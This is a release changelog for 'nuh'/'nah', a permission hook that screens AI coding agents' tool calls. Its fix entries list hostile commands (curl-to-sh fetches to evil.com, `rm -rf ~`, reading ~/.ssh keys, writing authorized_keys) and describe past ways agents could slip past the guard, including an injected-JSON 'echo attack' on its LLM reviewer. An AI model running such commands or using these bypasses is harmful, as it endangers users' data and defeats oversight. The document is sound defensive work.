  `~/.local/state/nuh/llm-heal.<provider>`, probes the host's `/api/ps` and
  `/api/tags`, and only when the server is up and the model listed but not
  loaded replays the request that timed out (10-minute cap) so the load
  finishes. The cooldown is the cap: the worker stamps the file when its
  attempt starts and when it ends, so no worker starts while one runs and
  the next attempt comes at least 10 minutes after the last ended. The
  request travels over
  a pipe, never to disk. Each run is one line in
  `~/.local/state/nuh/llm-heal.jsonl` (newest 500, no request content);
  `nuh heal-log` shows them.
- **Hook time limits.** `hook.deadline_s` (default 20 s, global only) bounds
  parsing, classification and content scanning: running out never allows.
  `nuh install` / `nuh update` register the hook with `"onFailure": "block"`
  (Claude Code) and a `"timeout"` of the deadline plus the providers'
  timeouts plus 10 s, at least 60 (Claude Code and Codex). The LLM cascade
  shares one budget: that hook timeout (the installed script carries it;
  60 s for an older script) minus a 5 s margin and the time already spent.
  Each request's timeout is cut to what is left, and a provider reached
  with under a second left is skipped with "the hook's time budget ran
  out", so `llm.on_failure` decides the call and it is logged before Claude
  Code's timeout. Run `nuh update` after changing either timeout.
- **The notice.** Every ask and block shows one line, `⚠️ **nuh?** Bash ·
  \`command\` · reason · \`#a7Kq2x\``, and `⛔ **nuh!**` for blocks. The
  reason is the one that set the final decision, the LLM's after 🤖;
  `(🤖 wanted block)` follows it when the LLM's own verdict differs from the
  final one. `#a7Kq2x` is the end of the tool call ID, which `nuh log --call
  a7Kq2x -v` finds. Claude clients render it as Markdown, so every value nuh
  did not write goes through `md.code_span` or `md.escape`: prose escapes
  ``\ ` * _ ~ [ ] < > &`` and a leading `#`, `-`, `+`, `=` or list number;
  link-shaped words go in code spans, which no renderer links; hidden
  characters show escaped, line breaks as `⏎`. See "The notice" in
  [how it works](site/how-it-works.md).
- **The decision log records every step of a decision**, in order, as
  `steps`: the static verdict with its breakdown (Bash's stages, or the
  checks that objected), the LLM's own verdict and reasoning before any cap,
  and each merge (`cap`, `escalate`, `lower`, `adopt`, `human_only`, `tool`,
  `fail_closed`, `uncertain`, `keep`, `strictest`) with its rule. Both the
  static and the LLM reason are kept. `nuh log -v` and `nuh test` show the
  steps one per line; `nuh log` / `nuh tail` show a capped verdict as
  `<provider>:block→ask`, and `nuh test` prints `LLM decision: BLOCK` with
  `After cap: ASK`. The 0.5.5 fields `classify`, `llm.decision`,
  `llm.reasoning` and `warning` are gone (the steps hold them; `nuh log`
  still reads older entries). Steps are bounded: reasons at 500 characters,
  breakdowns at 32 items. See "Steps" in the [CLI reference](site/cli.md).
- **Full tool input in the decision log**, raw. Entries gain `tool_input`,
  the complete tool input (the Bash `input` summary is still cut at 200
  chars), so logged decisions can be replayed. Nothing in the log is
  redacted, `export NAME=***` masking included: by the time a tool call
  exists its secret is already in the agent's transcript and on the model
  provider's servers, and a masked log breaks replay. Every string value is
  capped at `log.max_input_chars` (default 20000; cut values are marked and
  the entry gets `tool_input_truncated`). Rotation defaults to 50 MB and
  keeps `log.backups` generations (default 5: `nuh.log.1` … `nuh.log.5`);
  `nuh log` reads across the backups. Entries also carry the payload's
  `agent_id`, `agent_type` and `tool_use_id` when present.
- **`nuh log` filters and views, `nuh tail`.** `-s/--since` (30s, 10m, 2h,
  1d, today), `-d/--decision`, `-t/--tool`, `--action-type`,
  `-p/--project`, `-g/--grep` (regex on the input), `--llm`, `--errors` (a
  failed review), `--call` (a whole tool call ID or its start or end, with
  or without `toolu_` or a leading `#`, or `SESSION:ID`), `--session` (an ID
  prefix), `-a/--all` (every rotated log), `-r/--reverse`, `-v/--details`,
  `-I/--full-input` and `-f/--follow` (survives log rotation). Compact
  lines fit the terminal width and show the session, the tool call ID, a
  `sub:<agent type>` mark for subagent calls, the LLM's verdict, and a mark
  when the entry names a trace directory; `-v` adds the steps and the
  cascade. Colour only on a terminal, honouring `NO_COLOR` and `TERM=dumb`.
  `nuh tail` is `nuh log -f` starting from the last 10 entries.
- **LLM traces.** Opt-in `llm.trace_dir` (global only; off when unset).
  Each hook call that reaches the LLM step writes one directory named
  `<UTC timestamp>_<tool_use_id>` (a UUID when the payload has none), so a
  trace joins its log line and transcript entry, holding `input.json`,
  `classification.json`, a `request-NN-<provider>.json` /
  `response-NN-<provider>.json` pair per cascade attempt (exact body sent,
  full raw response, or the exception), and `result.json` (the LLM's
  verdict, `can_block`, `after_cap`, the final answer and its steps).
  Unredacted apart from auth headers and credential URL parameters;
  directories `0700`, files `0600`. Trace failures never change a
  decision. A top-level `trace: false` in a project's `.nuh.yaml` turns
  tracing off for calls in that project; a project cannot turn it on or
  redirect it.
- **Trace retention: `llm.trace_keep_days`** (default 30; `0` keeps traces
  forever). After the hook prints its decision, a traced call checks a
  marker beside the trace directory (one stat, about 2 µs); once a day it
  starts a background process that deletes trace directories past the
  cutoff. Only directories named as nuh trace names, older than the cutoff,
  not symlinks, and holding nothing but trace files are removed, file by
  file; anything else is left alone. `nuh trace --prune [--dry-run]` prunes
  now (an agent's `--prune` asks, under `nuh_admin`), and `nuh config show`
  shows the setting.
- **`nuh trace`: browse LLM traces from the terminal.** With fzf on a
  terminal, a picker lists the traces newest first (time, call reference,
  tool, input, decision, provider, system 1's verdict and probability, risk)
  and previews the highlighted one; `alt-a`/`alt-p`/`alt-d`/`alt-r` switch
  between its answers, prompt, decision path and raw files, Enter opens them
  all in `$PAGER`. Without fzf it prints the list. `nuh trace '#9c3f1a'`
  renders one trace. The answers view tabulates each system 1 question with
  its probability, confidence and the threshold that fired, then the verdict
  probabilities, the risk distribution, gates and the decision; the decision
  path is `nuh log -v`'s. Filters: `-s`, `-t`, `-d`, `--asks`, `--blocks`,
  `--provider`, `-n`; `--json` gives summaries. The list opens only the
  traces it shows (about 0.1 s for 200 of 50,000), and a partial or corrupt
  trace is listed as such, never fatal. nuh classifies it as a read.
- **`nuh test` LLM flags.** Point the LLM step at any provider for one run,
  with no config edit: `--provider` (alone in the cascade) with
  `--provider-url` / `--model`, `--timeout`, `--can-block` /
  `--no-can-block`, `--llm` / `--no-llm`, and `--set llm.KEY=VALUE` for any
  `llm.*` key. The overrides live in memory; nothing is written to a config
  file. Session context: `--user` (repeatable), `--first-prompt`,
  `--transcript`, `--cwd`. `nuh test` prints the effective LLM settings
  (keys shown as set or not, never their value) and the decision after the
  cap; `--show-request` prints each request as sent and the raw response.
  `--llm` reviews a Bash command even when the hook would skip it.
  Write/Edit tests report the LLM's part of the decision, and a clean
  script file is reviewed as the hook does (`bash_review.route`), printing
  `LLM review: script file` and `After review:`.
- **`nuh config show` prints every effective setting**, walked from the
  merged config so a new one cannot be left out, and labelled with the key
  you write in YAML.
- **Unknown config keys warn.** A key nuh does not read, at the top level of
  either config, under `llm:`, or in a provider's section
  (`llm.ollama.port`), prints one stderr line, shows in `nuh config show` as
  `unknown keys (ignored)`, and is ignored; `llm.tools` and
  `llm.human_only` say they are top-level keys.
- **Codex integration.** Agent detection with an explicit `NUH_AGENT`
  override, per-agent installation, and multi-file `apply_patch`
  inspection, with patch operations shown to the reviewer (removed lines,
  additions, hunk context, move destinations; partial updates told apart
  from whole-file writes). A Codex ask denies the attempt ("Review
  required"), since Codex hooks cannot request approval. A Codex subagent's
  rollout holds only history forked from its parent, so nuh follows
  `session_meta.parent_thread_id` links (up to 4 hops) to the session the
  user types into for the user's messages, and leaves the forked history
  out of the subagent's own context. Codex hook paths get guard
  self-protection.
- **Shell state.** nuh follows the cds of a command, before compound syntax
  and after it closes, and the variables it sets. A `for` list's words,
  globs, `~`, braces and known variables are expanded to the loop's values
  and each use is checked once per value, so `for f in ~/.ssh/*; do cat
  "$f"; done` blocks as `cat ~/.ssh/id_rsa` does (a glob with no match stays
  as written). An assignment in a `for` body reaches the later commands of
  the body; `W=$(ls dir/*PRINT.txt)` matching exactly one file sets `W` to
  it; `$((…))` over known integers is computed. A list nuh cannot list
  (`$(cat list)`, an unknown variable, `**`, over 256 values), the names
  `read` sets, and a variable set to a value nuh cannot resolve make a path
  use ask "uses $f … cannot resolve"; as text (`echo "$f"`) they stay
  allowed. A heredoc body fed to `cat`/`tee` whose output no pipe carries on
  is text: `cat > p.html <<'EOF'` checks `p.html`, not the `</h1>` in the
  body.
- **Write-then-run.** `cat > x.sh <<'EOF' … EOF` followed directly (or
  after one `chmod`) by `bash x.sh` / `python3 x.py` / `./x.sh` classifies
  the run against the heredoc body instead of asking "script not found",
  when the file does not exist yet (`nuh.script_writes`): a shell script
  command by command like `bash -c`, any other interpreter as inline code.
- **Program identity, runners and task runners.** A `/`-spelled program
  that is not the tool on PATH (or a standard bin dir, venv entry or global
  classify path) is a script nuh inspects (`./git status` asks). `uv run`,
  `uvx`, `poetry run`, `pipx run`, `npx`/`npm exec`, `pnpm exec|dlx`,
  `bunx`, `yarn exec|dlx`, `bundle exec` and `mise exec` classify the
  command they run; `make`, `npm|pnpm|yarn run`, `just` and `task` read the
  recipe and classify each line. `find -exec` payloads are classified per
  root.
- **Project root from the launch dir.** Global `project_root:
  git_or_launch_dir` uses the directory the agent was launched in
  (`$CLAUDE_PROJECT_DIR`; Codex: the payload `cwd`) when there is no git
  root. `/`, `$HOME` and anything above it are refused; git still wins.
- **`project_lifts_sensitive`** (global). A path inside the project skips
  your own global `sensitive_paths` entries at or above the project root,
  so launching in `~/Documents/Club` under `~/Documents: ask` frees `Club` while
  `~/Documents/Other` still asks. Built-in entries, `~/.ssh`, entries inside
  the project, `.nuh.yaml` entries, protected writes and content checks
  still apply; symlinks out are never lifted, and a shell word only when
  every path it can expand to (each glob match) is inside. A word whose
  glob and expansion characters are all quoted or escaped
  (`"Sub Dir (x)"`) names only its spelling, also when it uses variables
  nuh resolves (`"$S/Sub Dir (x)"`, a loop's `"Dir (x)/$f.pdf"`): a quoted
  value is neither split nor globbed, spaces included, so only where it
  leads decides. An unquoted variable keeps the word literal only when its
  value holds no glob character or whitespace; a variable nuh cannot
  resolve, or a command substitution, still asks. Unquoted braces and globs
  next to quoted text still expand, and are lifted when every piece and
  match is inside (`"$S/Dir (x)/R-"{a,b}".pdf"`, `"$S/Dir (x)/"*.pdf`).
- **File context for Write/Edit reviews.** The LLM sees what the file holds
  now: an Edit the whole file when small, else `llm.file_context_lines`
  (default 30) lines around each edit; a Write over an existing file its
  current content. Capped by `llm.file_context_chars` (default 8000); `0`
  on either turns it off. Never for sensitive paths.
- **Host trust by domain suffix and IP range.** `known_registries` entries
  (and `nuh trust`) accept `*.example.com` / `.example.com` (any subdomain,
  dot boundary, apex not included), single IPs, and CIDR ranges such as
  `192.0.2.0/24`. `nuh trust` validates entries and rejects URLs, ports,
  paths, misplaced wildcards, TLD-wide suffixes and ranges broader than /8
  (IPv4) or /32 (IPv6). Malformed config entries are ignored with a
  warning. Host names compare case-insensitively. Network writes still
  always ask.

### Fixed

- **`--help` on a nuh command is a read.** `nuh trust --help`, `nuh allow
  -h`, `nuh system1 export --help` and `nuh trace --prune --help` asked
  under the `nuh_admin` floor as if they changed something; argparse only
  prints the help. A `-h` or `--help` word before any `--` now makes a
  `nuh` command `filesystem_read`. After `--` it is an operand (`nuh trust
  -- -h` trusts a host named `-h`), and inside a quoted value (`nuh
  classify "foo -h" TYPE`) it is not a flag, so both still ask. `nuh claude
  --help` is claude's help and keeps its classification.
- **An "outside project" hint names the path that asked.** The hint took the
  first path-like word, while the boundary check used the last, so `rm ./x
  /opt/n` suggested trusting the project directory. It now names the
  operand the boundary check decided by (`nuh trust /opt`).
- **The hook prints at most one decision.** An error after the decision was
  written sent an error answer as a second JSON object, so the real
  decision was replaced by a generic ask with no log row. The answer is now
  serialized before anything is written, and once it is on stdout an error
  only reaches stderr, the trace and the log (the row keeps the decision
  sent and marks `internal_error.after_answer`).
- **Guard failure handling.** The installed guard preserves output already
  captured on a successful `SystemExit` (it used to exit without it) and
  validates the hook answer's structure, not only that it parses as JSON.
- **More variables are known or unknown, never a file here.** A variable
  neither set in the command nor in nuh's environment is unknown where a
  path goes (`cat "$SECRET_FILE"` asked nothing before); `${X:-word}` takes
  X if nuh's environment has it, else `word`. Redirect targets read earlier
  assignments (`F=~/.ssh/authorized_keys; echo x > $F` blocks). A script
  named `~/x.py` or `"$VIRTUAL_ENV/bin/activate"` is that path, not one
  under the cwd.
- **Bash words read as the shell reads them.** A quoted `>` is no redirect
  (`awk 'NR>=5'` asked "redirect to sensitive path"); awk's own output files
  (`print > "f"`) are checked from its program, and a file named by an
  expression asks. A sed script, awk program or grep/rg pattern is not a
  path, while a sed script's `r`/`w` files are (`sed -n 'w
  ~/.ssh/authorized_keys'` blocks).
- **Slow input can no longer time the hook out.** Several content regexes
  ran in quadratic time on one long line repeating their trigger: the `curl
  … -d` / `--data` / `-X POST`, `base64 … -d | bash` and `urllib … data=`
  patterns, both `rm -rf` patterns (a long flag run) and the
  `BEGIN.*PRIVATE` credential-search pattern. All are linear now with
  unchanged matches (`GapPattern` for `ANCHOR … TAIL` patterns, a lookahead
  for `rm -rf`, a bounded search end for the other).
- **Scripts are content-scanned whole.** The deterministic scan read only
  the first 64 KB of a script file, so a payload after it scanned clean with
  the LLM off. Scripts are now read up to a 4 MiB cap; a larger one asks
  ("script too large to inspect"). All content scans (Write/Edit content,
  inline code, heredoc programs) share that cap and ask above it instead of
  scanning the first 1 MiB and calling the rest clean.
- **Remaining Bash classification bypasses.**
  - *Nested substitutions are classified*: in `echo $(echo $(rm -rf ~))`
    only the outer `$(…)` used to be read, so the delete was allowed. Each
    substitution's own `$(…)`, backticks and `<(…)` are now extracted and
    classified recursively (strictest wins, capped at the shell-unwrapping
    depth; deeper nesting blocks), including the remote-code check.
  - *Quotes inside arithmetic don't quote*: `$(( '$(cmd)' ))`, `(( … ))`,
    `$[ … ]` and `${x:-'…'}` inside them run `cmd` in bash and zsh, and now
    have it extracted.
  - *Redirects on compound commands are writes*: `{ …; } > f`, `( … ) > f`,
    `… done > f`, `… fi > f`, `… esac > f`, a bare `> f` (truncation) and a
    leading `> f cmd` are classified as writes to `f`. A pipe after `}`,
    `done` or `fi` now reaches the composition rules, so `{ curl …; } | sh`
    blocks as remote code execution.
  - *An unparseable stage no longer masks a block*: shlex failing on one
    stage made the whole command ask. The other stages are now classified
    and the strictest wins; the unparseable stage itself still asks
    (regardless of the `unknown` policy).
  - *`$'…'` ANSI-C strings are decoded* before tokenizing
    (`nuh.shell_ansi`), so `$'\x72m' -rf ~` classifies as `rm`. Escapes bash
    and zsh decode differently (`\cX`, unknown escapes, NUL) leave the stage
    unparseable (ask).
  - *Heredoc body words are not redirects*: `def f() -> str:` made a bogus
    write to `str:`.
- **A newline separates commands.** The Bash classifier split on `|`, `&&`,
  `||` and `;` but not on newline, so a multi-line command was one stage
  named after its first word: `echo hi` + newline + `rm -rf ~/x` classified
  as `echo` and was allowed, and `git status` + newline + `git push --force`
  as `git_safe`. Splitting (`nuh.shell_split`) treats an unquoted top-level
  newline like `;`. Newlines inside quotes, `$'…'`, substitutions and
  heredoc bodies do not split; a heredoc body stays with the command that
  has the `<<` (so in `cat <<'EOF' | sh` the body goes to `cat`, and the
  `sh` stage asks as `read | exec`). A line after the delimiter line is its
  own command. Blank lines and a newline after `|`, `&&` or `||` add no
  stage, backslash-newline continuations are joined as the shell joins
  them, and an unquoted `#` starting a word is a comment to end of line, so
  an apostrophe in a comment no longer hides the next line. Multi-line
  `for`/`while`/`if`/function/brace bodies classify like their `;` forms.
  `\r\n` line endings behave like `\n`; a lone `\r` is not a separator.
- **Background `&` separates commands.** `echo hi & rm -rf ~/` was one stage
  classified as `echo` and allowed; `&`, and zsh `&!` / `&|`, now split
  stages like `;` (redirect forms `&>`, `>&`, `<&` are unaffected).
- **Literal `$(` / `<(` no longer blocks as "unbalanced substitution".**
  Substitution extraction (`nuh.shell_lex`) follows shell quoting: `<(` /
  `>(` inside double quotes, `\$(` anywhere, `$'…'` strings and
  quoted-delimiter heredoc bodies (`<<'EOF'`, `<<"EOF"`, `<<\EOF`) are
  literal; unquoted-delimiter bodies still have their `$(…)` and backticks
  extracted and classified. Heredoc bodies are not split into stages on `|`
  / `;`, and an apostrophe in one no longer makes the command unparseable,
  so `git commit -m "$(cat <<'EOF' … EOF)"` with "it's" in the message is
  classified normally. A body a shell reads as its program (`bash
  <<'EOF'`) is classified like `bash <<< '…'`. `$((…))` arithmetic has its
  inner `$(…)` extracted, a substitution in command position that fetches
  from the network (`$(curl …)`) blocks as remote code execution, and an
  unparseable stage no longer hides a blocked substitution. Real unbalanced
  substitutions still fail closed.
- **Pipe into an interpreter is judged by where its program comes from.**
  `network | exec`, `decode | exec` and `read | exec` fired for any exec
  sink, so `curl … | python -c 'json.load(sys.stdin)'` was blocked as
  remote code execution although stdin was only data. An allowlist table
  (`exec_source.py`) reads how python, node, ruby, perl, php and
  bash/sh/dash/zsh receive their program (`-c`/`-e`/`-r`/`-m`, a script
  path); when the program provably comes from elsewhere, the stages keep
  their normal classification. Bare/`-`/`-s`/`/dev/stdin` forms, unknown
  flags, `eval`, interpreters outside the table, inline code that evaluates
  its input (`exec(sys.stdin.read())`, `bash -c 'cat | sh'`) and program
  arguments built from substitutions still block.
- **Network-sourced program text blocks as RCE.** `python -c "$(curl …)"`,
  `` python -c "`curl …`" ``, `bash <(curl …)`, `. <(curl …)`, `sh <<<
  "$(curl …)"`, `sh < <(curl …)`, and `curl … > >(sh)` / `| tee >(sh)` only
  asked about the host, so trusting the host would have allowed them. They
  now block regardless of host trust.
- **zsh pipe forms.** `|&` is a pipe (it was parsed as `| &`), and `=cmd` in
  command position is the command (`curl … | =sh` blocks like `| sh`).
- **curl/wget host extraction skips option values.** The first non-flag
  argument was taken as the host, so `-o $S/file.json`, `-A "Mozilla/5.0
  …"`, `-O scripts.js` and `--header "Accept: …"` produced bogus "unknown
  host" prompts. `net_hosts.py` parses both tools' option tables (separate,
  `--opt=value`, `-ofile` and `-sSo file` forms) and returns every
  destination: all URLs, `--url`, proxies (`-x`, `--socks5…`, wget `-e
  https_proxy=`), and `--resolve` / `--connect-to` targets. `wget -i` /
  `curl -K` report an unknowable destination. The network decision is the
  strictest across all hosts, so `curl https://github.com/a
  https://evil.example/b` asks.
- **zsh hardening.** The commands nuh guards run in zsh, and several
  zsh-only constructs were under-classified (`zsh_syntax.py`):
  - glob qualifiers that run code (`ls *(e:'curl … | sh':)`, `*(e{…})`,
    `*(#qe…)`) were allowed as `filesystem_read`; the code is now extracted
    and classified like a `$(…)` inner, an unparseable qualifier mentioning
    `e`/`+` blocks, and `*(+func)` asks (the function body is invisible);
  - `=(…)` temp-file substitution is classified like `<(…)`, including as a
    script path (`python3 =(curl …)` blocks);
  - `${(e)var}` (and any parameter flags containing `e`) blocks as
    evaluation; a command name from `${=var}` asks with a clear reason;
  - precommand modifiers `noglob`, `nocorrect`, `builtin`, `exec` and `-`
    are stripped so the real command is classified (`builtin eval '…'`
    unwraps the eval'd string);
  - compound commands — anonymous functions `() { … }`, short loop/if
    bodies (`for x in a; { … }`, `if [[ … ]] { … }`), `repeat N`, `{ … }
    always { … }`, and the bash `do`/`then`/`else` keyword forms — have
    their bodies classified instead of asking about `{`/`do` as a command.
    `case` asks, with a reason. Heredoc bodies are never split or globbed.
- **Process substitution is not a file target.** `tee >(cat -n)` and `cat
  <(ls)` pass the command a `/dev/fd/N` pipe, but the placeholder was
  boundary-checked as a file under the working directory, so the verdict
  depended on the cwd. Process substitutions now classify as an
  already-open descriptor, and a real file argument beside one is still the
  checked target.

## [0.5.5] - 2026-03-26

### Fixed

- `__version__` in `__init__.py` now matches `pyproject.toml` — `nah --version` was reporting 0.5.2 instead of the installed version

## [0.5.4] - 2026-03-25

### Added

- **LLM credential scrubbing** — secrets (private keys, AWS keys, GitHub tokens, `sk-` keys, hardcoded API keys) are now redacted from transcript context and Write/Edit/MultiEdit/NotebookEdit content before sending to LLM providers. Reuses `content.py` secret patterns (nah-pfd)
- **MultiEdit + NotebookEdit tool guard** — both tools now get the same protection as Write/Edit: path checks, boundary enforcement, hook self-protection (hard block), content inspection, and LLM veto gate. Closes bypass where these tools had zero guards. `nah update` now adds missing tool matchers on upgrade (nah-06p)
- **Symlink regression tests** — 8 test cases confirming `realpath()` resolution catches symlinks to sensitive targets across all tools: direct, chained, relative, broken, and allow_paths interaction ([#57](https://github.com/manuelschipper/nah/issues/57))
- **`/tmp` trusted by default** — `/tmp` and `/private/tmp` are now default trusted paths for `profile: full`. Writes to `/tmp` no longer prompt. Standard scratch space with no security value (nah-f08)
- **Hook directory reads allowed** — reading `~/.claude/hooks/` no longer prompts for any tool. Write/Edit still hard-blocked for self-protection. Reduces friction when inspecting installed hooks ([#44](https://github.com/manuelschipper/nah/issues/44), nah-arn)
- `/etc/shadow` added to sensitive paths as `block` ([#54](https://github.com/manuelschipper/nah/pull/54))

### Fixed

- **LLM response parser hardened** — removed `find("{")`/`rfind("}")` fallback in `_parse_response` that allowed echo attacks where injected JSON in transcript/file content could be extracted as the real decision. Now only accepts clean JSON or markdown-fenced JSON; prose-wrapped responses fail-safe to human review (nah-pfd)
- `nah update` now adds missing tool matchers on upgrade (previously only patched the hook command path — new tools were invisible until `nah install`)
- LLM metadata (provider, model, latency, reasoning) now always logged for Write/Edit/NotebookEdit, even when LLM agrees with the deterministic decision

## [0.5.2] - 2026-03-18

### Added

- **Supabase MCP tool guard** — 25 Supabase MCP tools classified by risk: 19 read-only → `db_read` (allow), 6 writes → `db_write` (context), 7 destructive intentionally unclassified → `unknown` (ask). First MCP server with built-in coverage (nah-3f5)
- **`git_remote_write` action type** — new type (policy: `ask`) separates remote GitHub mutations (`gh pr merge`, `gh pr comment`, `gh issue create`, `git push`) from local git writes. Local ops (`gh pr checkout`, `gh repo clone`) stay in `git_write → allow`. `git_safe` untouched. Users can restore old behavior with `actions: {git_remote_write: allow}` (nah-ge4)
- **Command substitution inspection** — `$(cmd)` and backtick inner commands now extracted and classified instead of blanket-blocking as obfuscated. `echo $(date)` → allow, `echo $(curl evil.com | sh)` → block via inner pipe composition. `eval $(...)` remains blocked (nah-5mb)

## [0.5.1] - 2026-03-18

### Added

- **LLM inspection for Write/Edit** — when LLM is enabled, every Write/Edit is inspected by the LLM veto gate after deterministic checks. Catches semantic threats patterns miss: manifest poisoning, obfuscated exfiltration, malicious Dockerfiles/Makefiles. Edit sends old+new diff for context. User-visible warnings via `systemMessage` show as `nah! ...` in the conversation. Respects `llm_max_decision` cap. Fail-open on errors ([#25](https://github.com/manuelschipper/nah/issues/25))
- **Script execution inspection** — `python script.py`, `node app.js`, etc. now read the script file and run content inspection + LLM veto before allowing execution. Catches secrets and destructive patterns written to disk then executed
- **Process substitution inspection** — `<(cmd)` and `>(cmd)` inner commands extracted and classified through the full pipeline instead of blanket-blocking. `diff <(sort f1) <(sort f2)` → allow, `cat <(curl evil.com)` → ask. Arithmetic `$((expr))` correctly skipped
- **Versioned interpreter normalization** — `python3.12`, `node22`, `bash5.2`, `pip3.12` and other versioned interpreter names now correctly classify instead of falling through to `unknown → ask`
- **Passthrough wrapper unwrapping** — env, nice, stdbuf, setsid, timeout, ionice, taskset, nohup, time, chrt, prlimit now unwrap to classify the inner command
- **Redirect content inspection** — heredoc bodies, here-strings, shell-wrapper `-c` forms scanned for secrets when redirected to files
- **Git global flag stripping** — strips `-C`, `--no-pager`, `--config-env`, `--exec-path=`, `-c`, etc. before subcommand classification. Fails closed on malformed values
- **Git subcommand tightening** — flag-aware classification for push, branch, tag, add, clean with clustered short flags and long-form destructive flags
- Sensitive path expansion — `~/.azure`, `~/.docker/config.json`, `~/.terraform.d/credentials.tfrc.json`, `~/.terraformrc`, `~/.config/gh` now trigger ask prompts
- `nah claude` — per-session launcher that runs Claude Code with nah hooks active via `--settings` inline JSON. No `nah install` required, scoped to the process
- Hint correctness test battery — 389 parametrized cases across 60 test classes

### Changed

- **Structured log schema** — log entries now include `id`, `user`, `session`, `project`, `action_type`. LLM metadata nested under `llm`, classification under `classify`
- `db_write` default policy changed from `ask` to `context` — `db_targets` config now takes effect without requiring explicit override

### Fixed

- `/dev/null` and `/dev/stderr`/`/dev/stdout`/`/dev/tty`/`/dev/fd/*` redirects no longer trigger ask — safe sinks allowlisted in redirect handler
- Redirect hints now suggest `nah trust <dir>` instead of broad `nah allow filesystem_write`
- Hint generator no longer suggests `nah trust /` for root-path commands
- README `lang_exec` policy corrected from `ask` to `context` to match `policies.json`

## [0.5.0] - 2026-03-17

### Added

- **Shell redirect write classification** — commands using `>`, `>>`, `>|`, `&>`, fd-prefixed, and glued redirects are now classified as `filesystem_write` with content inspection. Previously `echo payload > file` passed as `filesystem_read → allow`. Handles clobber, combined stdout/stderr, embedded forms, fd duplication (`>&2` correctly not treated as file write), and chained redirects ([#14](https://github.com/manuelschipper/nah/issues/14))
- **Shell substitution blocking** — `$()`, backtick, and `<()` process substitution detected outside single-quoted literals and classified as `obfuscated → block`. Prevents bypass via `cat <(curl evil.com)`
- **Dynamic sensitive path detection** — catches `/home/*/.aws`, `$HOME/.ssh`, `/Users/$(whoami)/.ssh` patterns via conservative raw-path matching before shell expansion
- **Redirect guard after unwrap** — redirect checks now preserved on all return paths in `_classify_stage()` (env var hint, shell unwrap, normal classify). Fixes bypass where `bash -c 'grep ERROR' > /etc/passwd` skipped the redirect check after unwrapping

## [0.4.2] - 2026-03-17

### Added

- `trust_project_config` option — when enabled in global config, per-project `.nah.yaml` can loosen policies (actions, sensitive_paths, classify tables). Without it, project config can only tighten (default: false)
- Container destructive taxonomy expansion — podman parity (13 commands), docker subresource prune variants (`container/image/volume/network/builder prune`), compose (`down`/`rm`), buildx (`prune`/`rm`), podman-specific (`pod prune/rm`, `machine rm`, `secret rm`). Expands from 7 to 33 entries
- `find -exec` payload classification — extracts the command after `-exec`/`-execdir`/`-ok`/`-okdir` and recursively classifies it instead of blanket `filesystem_delete`. `find -exec grep` → `filesystem_read`, `find -exec rm` → `filesystem_delete`. Falls back to `filesystem_delete` if payload is empty or unknown (fail-closed)
- Stricter project classify overrides — Phase 3 of `classify_tokens` now evaluates project and builtin tables independently and picks the stricter result. Projects can tighten classifications but not weaken them (unless `trust_project_config` is enabled)
- Beads-specific action types — `beads_safe` (allow), `beads_write` (allow), `beads_destructive` (ask) replace generic db_read/db_write classification for `bd` commands. Includes prefix-leak guards for flag-dependent mutations (nah-1op)
- `sensitive_paths: allow` policy — removes hardcoded sensitive path entries entirely, giving users full control to desensitize paths like `~/.ssh` (nah-9lw)

### Fixed

- Global-install flag detection now handles `=`-joined forms (`--target=/path`, `--global=true`, `--system=`, `--root=`) and pip/pip3 short `-t` flag — previously only space-separated forms were caught, allowing `pip install --target=/tmp flask` to bypass the global-install escalation
- Bash token scanner now respects `allow_paths` exemption — previously only file tools (Read/Write/Edit) checked `allow_paths`, so SSH commands with `-i ~/.ssh/key` still prompted even when the path was exempted for the current project (nah-jwk)

## [0.4.1] - 2026-03-15

### Changed

- `nah config show` displays all config fields
- Publish workflow now auto-creates GitHub Releases from changelog

### Fixed

- `format_error()` emitting invalid `"block"` protocol value instead of `"deny"` for `hookSpecificOutput.permissionDecision` — Claude Code rejected the value and fell through to its built-in permission system, silently defeating nah's error-path safety guard (PR #20, thanks @ZhangJiaLong90524)

## [0.4.0] - 2026-03-15

### Changed

- LLM eligibility now includes composition/pipeline commands by default — if any stage in a pipeline qualifies (unknown, lang_exec, or context), the whole command goes to the LLM instead of straight to the user prompt

### Added

- xargs unwrapping — `xargs grep`, `xargs wc -l`, `xargs sed` etc. now classify based on the inner command instead of `unknown → ask`. Handles flag stripping (including glued forms like `-n1`), exec sink detection (`xargs bash` → `lang_exec`), and fail-closed on unrecognized flags. Placeholder flags (`-I`/`-J`/`--replace`) bail out safely (FD-089)

### Fixed

- Remove `nice`, `nohup`, `timeout`, `stdbuf` from `filesystem_read` classify table — these transparent wrappers caused silent classification bypass where e.g. `nice rm -rf /` was allowed without prompting (FD-105)
- Check `is_trusted_path()` before no-git-root bail-out in `check_project_boundary()` and `resolve_filesystem_context()` — trusted paths like `/tmp` now work correctly when cwd has no git root (FD-107)

## [0.3.1] - 2026-03-13

### Changed

- Documentation and README updates

## [0.3.0] - 2026-03-13

### Added

- Active allow emission — nah now actively emits `permissionDecision: allow` for safe operations, taking over Claude Code's permission system for guarded tools. No manual `permissions.allow` entries needed after `nah install`. Configurable via `active_allow` (bool or per-tool list) in global config (FD-094)
- `/nah-demo` skill — narrated security demo with 90 base cases + 21 config variants covering all 20 action types, pipe composition, shell unwrapping, content inspection, and config overrides. Story-based grouping with live/dry_run/mock execution modes (FD-039)
- `nah test --config` flag for inline JSON config overrides — enables testing config variants (profile, classify, actions, content patterns) without writing to `~/.config/nah/config.yaml` (FD-076)

### Fixed

- Fix regex alternation pipes (`\|`, `|`) inside quoted arguments being misclassified as shell pipe operators — replaced post-shlex glued operator heuristic with quote-aware raw-string operator splitter. Fixes grep, sed, awk, rg, find commands with alternation patterns (FD-095)
- Fix classify path prefix matching bug — user-defined and built-in classify entries with path-style commands (e.g. `vendor/bin/codecept run`, `./gradlew build`) now match correctly after basename normalization (FD-091)

## [0.2.0] - 2026-03-12

Initial release.

### Added

- PreToolUse hook guarding all 6 Claude Code tools (Bash, Read, Write, Edit, Glob, Grep) plus MCP tools — sensitive path protection, hook self-protection, project boundary enforcement, content inspection for secrets and destructive payloads
- 20-action taxonomy with deterministic structural classification — commands classified by action type (not name), pipe composition rules detect exfiltration and RCE patterns, shell unwrapping prevents bypass via `bash -c`, `eval`, here-strings
- Flag-dependent classifiers for context-sensitive commands — git (12 dual-behavior commands), curl/wget/httpie (method detection), sed/tar (mode detection), awk (code execution detection), find, global install escalation
- Optional LLM layer for ambiguous decisions — Ollama, OpenRouter, OpenAI, Anthropic, and Snowflake Cortex providers with automatic cascade, three-way decisions (allow/block/uncertain), conversation context from Claude Code transcripts, configurable eligibility and max decision cap
